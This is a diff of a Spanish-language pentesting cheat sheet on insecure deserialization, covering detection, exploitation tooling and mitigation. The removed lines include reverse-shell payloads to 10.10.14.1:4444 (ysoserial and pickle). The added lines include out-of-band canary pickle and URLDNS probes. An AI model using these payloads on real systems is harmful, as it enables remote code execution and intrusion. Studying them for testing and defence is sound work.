@@ -1,140 +1,300 @@
 ---
 aliases:
   - Insecure Deserialization
-  - Deserialization
+  - Deserialization Vulnerability
+  - Object Injection
+  - Untrusted Deserialization
 tags:
   - type/vulnerability
   - vuln/insecure-deser
   - technique/execution
+  - technique/initial-access
+  - technique/privilege-escalation
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación|Explotación]]'
 tertiary categories:
-  - "[[Explotación Web]]"
-type: Vulnerability
+  - '[[Explotación Web]]'
+type: CheatSheet
 linked:
+  - '[[Insecure Deserialization - Deteccion y Reconocimiento]]'
+  - '[[Insecure Deserialization - Object Injection]]'
+  - '[[Insecure Deserialization - Formatos Estructurados]]'
+  - '[[Insecure Deserialization - Tooling]]'
+  - '[[Insecure Deserialization - Bypasses y Evasion]]'
+  - '[[XML External Entity (XXE)]]'
+  - '[[Server-Side Template Injection (SSTI)]]'
+  - '[[Burp Suite]]'
 ---
 # Insecure Deserialization
 
 ***
 
-## Cheatsheet por lenguaje
+## Cheatsheet
 
-| **Lenguaje / Format**      | **Marker**                                                   | **Tool**                        | **Gadget típico**                                    |
-| -------------------------- | ------------------------------------------------------------ | ------------------------------- | ---------------------------------------------------- |
-| **Java (nativo)**          | `rO0AB` (base64 de `\xAC\xED\x00\x05`) en cookies/params     | `ysoserial`                     | `CommonsCollections1`, `CommonsBeanutils1`, `Spring1`|
-| **Java JSON (Jackson)**    | `@class`, `@type` en JSON                                    | `ysoserial` + polymorphic type  | `c3p0`, `spring-aop`                                 |
-| **.NET BinaryFormatter**   | `AAEAAAD/////` en base64                                     | `ysoserial.net`                 | `TypeConfuseDelegate`, `ActivitySurrogateSelector`   |
-| **.NET ViewState**         | `__VIEWSTATE` con MAC off o `validationKey` leak             | `ysoserial.net` (ViewState)     | Depende del decryption key                           |
-| **PHP serialize()**        | Strings tipo `O:4:"User":1:{...}` en cookies/POST            | `phpggc`                        | `Laravel/RCE*`, `Monolog/RCE*`, `Symfony/RCE*`       |
-| **Python pickle**          | `\x80\x04` o `gASV` (base64 prefix)                          | Pickle payload con `__reduce__` | `os.system`, `subprocess.call`                       |
-| **Ruby Marshal / YAML.load** | `!ruby/object` en YAML                                     | `universal-rce-ruby-deserialization` | `Gem::Installer`, `Net::WriteAdapter`                |
-| **Node.js `serialize-js`** | `_$$ND_FUNC$$_`                                              | `nodejsshell.py` + `eval` gadget| IIFE con shell payload                               |
+### 🔍 Detección y Reconocimiento
 
-## Detección rápida
+````tabs
+tab: **Identificación de Formatos**
+![[Insecure Deserialization - Deteccion y Reconocimiento#^deser-detect-formats]]
 
-```bash
-# Java: buscar rO0AB en cookies/params
-curl -sI https://target/ | grep -i cookie
-# Valores iniciando con "rO0" (base64 de \xAC\xED) son serialized Java objects
+tab: **Fingerprint del Stack**
+![[Insecure Deserialization - Deteccion y Reconocimiento#^deser-detect-fingerprint]]
+````
 
-# .NET: buscar AAEAAAD en viewstate
-curl -s https://target/page.aspx | grep -oE '__VIEWSTATE[^"]*"[^"]*"'
+### 💉 Object Injection por Lenguaje
 
-# PHP: buscar patrones serialize()
-# O:<num>:"<classname>":<fields>:{...}
-# s:<len>:"<string>"
-# a:<num>:{...}
+````tabs
+tab: **PHP**
+![[Insecure Deserialization - Object Injection#^deser-php]]
 
-# Python pickle: check Content-Type application/octet-stream o session cookies
-```
+tab: **Java**
+![[Insecure Deserialization - Object Injection#^deser-java]]
 
-## Explotación
+tab: **Python (pickle)**
+![[Insecure Deserialization - Object Injection#^deser-python]]
 
-### Java con ysoserial
+tab: **.NET**
+![[Insecure Deserialization - Object Injection#^deser-dotnet]]
 
-```bash
-# Generar payload
-java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' > payload.ser
+tab: **Ruby**
+![[Insecure Deserialization - Object Injection#^deser-ruby]]
 
-# Inyectar según contexto
-# Via HTTP body:
-curl -X POST https://target/endpoint --data-binary @payload.ser -H "Content-Type: application/x-java-serialized-object"
+tab: **Node.js**
+![[Insecure Deserialization - Object Injection#^deser-node]]
+````
 
-# Via cookie (base64):
-COOKIE=$(base64 -w0 payload.ser)
-curl https://target/ --cookie "session=$COOKIE"
-```
+### 📦 Ataques a Formatos Estructurados
 
-### PHP con phpggc
+````tabs
+tab: **JSON Polymorphic**
+![[Insecure Deserialization - Formatos Estructurados#^deser-fmt-json]]
 
-```bash
-# Listar gadgets disponibles
-phpggc -l
+tab: **YAML Eval**
+![[Insecure Deserialization - Formatos Estructurados#^deser-fmt-yaml]]
 
-# Generar payload para Laravel RCE
-phpggc Laravel/RCE9 system 'id' > payload.txt
+tab: **XML Deserialization**
+![[Insecure Deserialization - Formatos Estructurados#^deser-fmt-xml]]
+````
 
-# O base64 directo:
-phpggc -b Laravel/RCE9 system 'id'
-```
+### 🛠️ Tooling de Exploit
 
-### Python pickle
+````tabs
+tab: **phpggc (PHP)**
+![[Insecure Deserialization - Tooling#^deser-tool-phpggc]]
 
-```python
-import pickle, os, base64
+tab: **ysoserial (Java)**
+![[Insecure Deserialization - Tooling#^deser-tool-ysoserial]]
 
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1',))
+tab: **ysoserial.net (.NET)**
+![[Insecure Deserialization - Tooling#^deser-tool-ysoserialnet]]
 
-payload = pickle.dumps(RCE())
-print(base64.b64encode(payload).decode())
-# Inyectar en cookie session o endpoint que deserializa
-```
+tab: **fickling (Python)**
+![[Insecure Deserialization - Tooling#^deser-tool-fickling]]
 
-### .NET BinaryFormatter
+tab: **Otros tools**
+![[Insecure Deserialization - Tooling#^deser-tool-others]]
+````
 
-```bash
-ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
-# Inyectar en ViewState, cookie o request body
-```
+### 🛡️ Bypasses y Evasión
+
+````tabs
+tab: **Magic Bytes y Encoding**
+![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-bytes]]
+
+tab: **Class Allowlist Bypass**
+![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-allowlist]]
+
+tab: **Length / Type Confusion**
+![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-types]]
+
+tab: **Deser Encadenada (multi-hop)**
+![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-chained]]
+````
+
+___
 
 ## Overview
 
-**Insecure Deserialization** ocurre cuando una aplicación convierte datos serializados controlados por el atacante en objetos in-memory sin validación. Los lenguajes con serialización nativa (Java, .NET, PHP, Python, Ruby) permiten que el proceso de deserialización **invoque métodos mágicos** (`__wakeup`, `readObject`, `__reduce__`) que pueden ejecutar código arbitrario.
+**Insecure Deserialization** = el backend deserializa datos controlados por el atacante (cookies, params, body, files) usando una API que reconstruye objetos con tipos arbitrarios. Reconstrucción dispara código del lenguaje (constructors, magic methods, `__reduce__`, `readObject`, `EventHandler`) → **RCE directo** o gadget chain.
 
-El impacto típico es **RCE directo**. La cadena de explotación se llama **gadget chain** — una secuencia de clases ya presentes en el classpath/autoload que, encadenadas vía deserialización, terminan en exec/system/eval.
+Vector clase A — **OWASP Top 10** desde 2013. CVE históricos masivos: Jenkins, WebLogic, JBoss, WebSphere, Spring, Struts2, Liferay, Confluence, Magento, Drupal, Sitecore, Symfony, Laravel, Telerik UI, etc.
 
-### Impacto
+### Por qué es tan común
 
-- **RCE inmediato** en la mayoría de casos.
-- **SSRF** si el gadget apunta a clases de red.
-- **Denial of Service** con payloads recursivos (Billion Laughs-style).
-- **Autenticación bypass** si el objeto deserializado tiene campos de auth manipulables.
+1. **APIs vulnerables son default** — `pickle.loads()`, `unserialize()`, `BinaryFormatter`, `ObjectInputStream` son el camino "natural" para deserializar.
+2. **Devs no distinguen serializado vs JSON simple** — pasan input untrusted por miedo a "perder estructura".
+3. **Magic methods se ejecutan automáticamente** — sin línea de código del dev que diga "ejecute esto".
+4. **Gadgets en classpath** — apps tienen 100+ libs en deps, alguna siempre ofrece chain.
+5. **Sticky vendor APIs** — frameworks legacy (.NET WebForms ViewState, Java RMI) lo usan internamente.
 
-### Prevención
+### Diferencia con vulns relacionadas
 
-- **No deserializar datos no-confiables** — regla absoluta.
-- Si se requiere serialización persistente, usar **formatos de datos puros** (JSON, protobuf) en vez de serialización con código ejecutable.
-- Firmar/verificar payloads serializados con HMAC antes de deserializar.
-- En Java: implementar `ObjectInputStream` custom con whitelist de clases (`lookAheadObjectInputStream`).
-- En .NET: evitar `BinaryFormatter` — obsoleto desde .NET 5, deprecated en .NET 7+.
-- En PHP: reemplazar `unserialize()` por `json_decode()` cuando posible.
+| | **Vector** | **Trigger** | **RCE típica** |
+|---|---|---|---|
+| **Insecure Deser** | Stream serializado (binario/string) | API deser del lenguaje | Gadget chain → exec |
+| **SSTI** | Template engine string | Render template | Lenguaje del template |
+| **XXE** | XML con DOCTYPE | Parser XML | File read + SSRF (RCE rara) |
+| **Code Injection** | String código (`eval`) | Eval directo | Inmediata |
+| **Prototype Pollution** | JSON `__proto__` / `constructor.prototype` | Merge / extend | Solo JS, post-explotación |
+
+___
+
+## Workflow de explotación
+
+```
+1. Identificar transport: cookie / param / body / upload con datos serializados.
+2. Decodificar capas: base64 → gzip → bytes binarios.
+3. Identificar lenguaje por magic bytes:
+   - PHP    → O:N: / a:N:
+   - Java   → 0xACED 0x0005 (rO0 b64)
+   - Python → 0x80 0x04 (gAS b64)
+   - .NET   → 0x00 0x01 0x00 0x00 (AAEAAA b64)
+   - Ruby   → 0x04 0x08 (BAh b64)
+   - Node   → "_$$ND_FUNC$$_function..."
+4. Probe canary OOB (URLDNS Java / DNS gadget Python):
+   - Si el canary dispara → readObject/loads activo → RCE alcanzable.
+5. Usar tool específica del lenguaje (phpggc / ysoserial / fickling / etc).
+6. Encadenar con bypass si hay filtros (ver Bypasses).
+7. Forge payload con cmd → enviar → recibir reverse shell o exec output.
+```
+
+___
+
+## Detección rápida
+
+### Indicadores en código backend
+
+```python
+# Python — todos vulnerables si input untrusted:
+pickle.loads(data)
+pickle.load(file)
+cPickle.loads(data)
+yaml.load(s)                         # sin Loader
+yaml.load(s, Loader=yaml.Loader)     # explícito
+shelve.open(path)
+numpy.load(path, allow_pickle=True)
+pandas.read_pickle(path)
+```
+
+```java
+// Java
+ois = new ObjectInputStream(input);
+ois.readObject();                    // VULN
+xstream.fromXML(input);              // VULN
+new ObjectMapper().enableDefaultTyping(); // VULN si default typing
+```
+
+```php
+// PHP
+unserialize($_COOKIE['user']);
+unserialize($_POST['data']);
+// Phar trigger:
+file_exists("phar://" . $userInput);
+```
+
+```csharp
+// .NET
+new BinaryFormatter().Deserialize(stream);  // VULN
+new ObjectStateFormatter().Deserialize(s);  // VULN
+JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
+    TypeNameHandling = TypeNameHandling.All  // VULN
+});
+```
+
+### Probes mínimos
+
+```bash
+# 1. Decode cookies y headers
+curl -sI https://target/ | grep -i 'set-cookie\|x-powered-by'
+echo "$cookie" | base64 -d | xxd | head -5
+echo "$cookie" | base64 -d | gunzip 2>/dev/null | xxd | head -5
+
+# 2. Search Burp historial (regex)
+# Magic byte regex: rO0|O:[0-9]+:|a:[0-9]+:|gAS|AAEAAAD|/wE|BAh|aced0005
+
+# 3. Java URLDNS canary
+java -jar ysoserial.jar URLDNS "http://canary.oast.fun/" | base64 -w0 | curl -X POST --data @- target/
+
+# 4. Python pickle canary
+python3 -c "import pickle, base64
+class C:
+    def __reduce__(self): import urllib.request; urllib.request.urlopen('http://canary.oast.fun/'); return (str, ('ok',))
+print(base64.b64encode(pickle.dumps(C())).decode())" \
+| curl -X POST --data @- target/
+```
+
+___
+
+## Impacto
+
+- **RCE pre-auth** — la mayoría de gadget chains entregan RCE sin credenciales.
+- **Account takeover** — manipulación de objetos User/Session si el sink es lookup.
+- **Privilege escalation** — modificación de roles si los flags están en el objeto serializado.
+- **SSRF** — gadgets que hacen HTTP fetch (URLDNS, JdbcRowSetImpl, etc).
+- **DoS** — billion-laughs equivalentes en serialización.
+- **Persistencia** — drop de webshell vía gadget de file write.
+
+___
+
+## Mitigación (defender)
+
+- **No deserializar input untrusted** — esto es la única defensa real. Usar JSON puro / Protobuf / formatos sin tipos polimórficos.
+- **Si imposible evitar**:
+  - Java: `ObjectInputFilter` (JEP 290) con allowlist estricta.
+  - .NET: `SerializationBinder` con allowlist.
+  - PHP: `unserialize($s, ['allowed_classes' => [...]])` con lista cerrada (PHP 7+).
+  - Python: usar `pickle` con `Unpickler` subclassed que sólo permita clases específicas.
+  - Ruby: `YAML.safe_load` siempre, nunca `YAML.load`.
+  - Node: nunca `node-serialize.unserialize` con input externo.
+- **Firma + verificación** — HMAC del blob serializado antes de deserializar (ASP.NET ViewState con MAC bien hecho).
+- **Cifrado del blob** — solo el server puede leer/modificar el serializado.
+- **Stateless tokens** — JWT firmado / opaque session IDs en lugar de objects serializados.
+- **Sandbox del proceso deserializador** — si imposible parar deser, correrla en proceso aislado sin credentials ni red.
+- **Mantener libs actualizadas** — Jackson, FastJson, XStream tienen CVE críticos cada pocos meses.
+
+___
+
+## Para entender Insecure Deserialization
+
+**Por qué deserialization ≠ JSON.parse:**
+
+`JSON.parse` produce objetos JS planos — sin tipos custom, sin métodos. Es safe.
+
+`pickle.loads` / `unserialize` / `BinaryFormatter.Deserialize` reconstruyen **objetos del lenguaje con sus métodos completos**. Eso significa que constructors, destructors, hooks de carga (`__wakeup`, `readObject`, `__reduce__`) se ejecutan. Si el atacante elige qué clase instanciar, ejecuta el código de esos hooks.
+
+**Gadget chains explicados:**
+
+Una gadget chain es una secuencia de objetos cuyas hooks se llaman en cascada hasta llegar a una sink (`Runtime.exec`, `system()`, `eval`). Atacante:
+
+1. Audita libs en classpath para encontrar clases con hooks "interesantes".
+2. Encadena: `ClassA.__hook__` → llama `ClassB.method` → llama `ClassC.eval(input)`.
+3. Forge serializado con la chain, donde `input = "comando atacante"`.
+4. App deserializa → cada hook se llama → último ejecuta comando.
+
+Tools como ysoserial / phpggc tienen catálogos pre-armados de chains conocidas. Por eso la explotación es triviales si ID el lenguaje y tenés gadgets disponibles.
+
+**Diferencia entre formatos binarios y polimórficos JSON:**
+
+- **Binario** (pickle, BinaryFormatter, Marshal) — el formato encapsula tipos. La superficie de ataque es default.
+- **JSON polimórfico** (Jackson `@class`, JSON.NET `$type`, FastJson `@type`) — formato es JSON pero el deserializer respeta hints de tipo del input. Mismo problema con sintaxis distinta.
+
+___
 
 ## Recursos
 
-- [ysoserial](https://github.com/frohoff/ysoserial) — Java
-- [ysoserial.net](https://github.com/pwntester/ysoserial.net) — .NET
-- [phpggc](https://github.com/ambionics/phpggc) — PHP
-- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
-
-## Notas relacionadas
-
-- [[LFI To RCE - Phar Deserialization]] — PHP phar:// + deserialización.
-- [[XML External Entity (XXE)]] — abuso análogo de parsers.
-- [[Server-Side Template Injection (SSTI)]] — otro camino a RCE en apps web.
+- [PortSwigger - Insecure Deserialization](https://portswigger.net/web-security/deserialization) — labs y conceptos.
+- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization) — payloads.
+- [HackTricks - Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization) — referencia exhaustiva.
+- [OWASP Deserialization Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
+- [ysoserial](https://github.com/frohoff/ysoserial) — Java gadgets.
+- [phpggc](https://github.com/ambionics/phpggc) — PHP gadgets.
+- [ysoserial.net](https://github.com/pwntester/ysoserial.net) — .NET gadgets.
+- [marshalsec](https://github.com/mbechler/marshalsec) — XML/JSON/YAML deser.
+- [fickling](https://github.com/trailofbits/fickling) — pickle audit.
+- [awesome-fastjson](https://github.com/safe6Sec/Fastjson) — FastJson chains.
+- [Frohoff - Java Deser BlackHat 2015](https://www.youtube.com/watch?v=VviY3O-euVQ) — paper original que popularizó la clase.
 
 ***
